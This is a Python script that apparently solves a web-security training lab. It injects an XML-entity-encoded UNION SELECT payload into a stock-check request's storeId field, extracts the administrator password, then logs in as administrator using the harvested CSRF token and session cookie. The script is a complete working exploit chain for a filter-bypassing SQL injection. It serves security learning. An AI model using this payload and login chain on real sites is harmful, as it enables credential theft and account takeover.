#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 27/9/2023
#
# Lab: SQL injection with filter bypass via XML encoding
#
# Steps: 1. Inject payload into storeId XML element to retrieve administrator password
#           using UNION-based attack
#        2. Extract administrator password from the response body
#        3. Fetch the login page
#        4. Extract the csrf token and session cookie
#        5. Login as the administrator
#        6. Fetch the administrator profile
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0af80068031e1d5d820d1a8a00d4007a.web-security-academy.net"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "storeId")

# payload to retrieve administrator password
payload = """<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        3 
    </productId>
    <storeId>
        1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
    </storeId>
</stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to inject the payload to retrieve the password of the administrator through exception")
    exit(1)

print(Fore.WHITE + "1. Injecting payload to retrieve administrator password using UNION-based attack.. " + Fore.GREEN + "OK")

# extract administrator password.
# if the pattern not work, change it to "(.*)\n",
# it depends on how the password is retrieved, after the the number of units or before them
# the 2 scenarios occured when I made tests, so be ready to face either of them
admin_password = re.findall("\n(.*)", injection.text)[0]

print(Fore.WHITE + "2. Extracting administrator password from the response.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)

try:  
    # fetch the login page
    fetch_login = requests.get(f"{url}/login")
    
except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching login page.. " + Fore.GREEN + "OK")

# get session cookie
session = fetch_login.cookies.get("session")

# Extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]

print(Fore.WHITE + "4. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# data to send via POST  
data = {
    "username": "administrator",
    "password": admin_password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login in as the administrator
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)

except:
    print(Fore.RED + "[!] Failed to login as the administrator through exception")
    exit(1)

print(Fore.WHITE + "5. Logging in as the administrator.. " + Fore.GREEN + "OK")

# get session cookie
new_session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": new_session
}

try:  
    # fetch the administrator profile
    admin = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
    exit(1)

print(Fore.WHITE + "6. Fetching the administrator profile.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


